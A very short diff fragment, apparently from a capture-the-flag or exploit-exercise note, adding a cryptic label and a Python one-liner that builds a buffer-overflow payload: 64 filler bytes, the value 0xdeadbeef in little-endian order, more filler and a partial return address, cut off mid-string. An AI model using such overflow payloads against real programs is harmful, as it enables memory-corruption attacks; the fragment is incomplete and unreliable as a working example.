@@ -1,0 +1,2 @@
+Var1CB
+	3ab+b			python -c 'print 64 * "A" + "\xef\xbe\xad\xde" + 4 * "A" + "\x36\x92
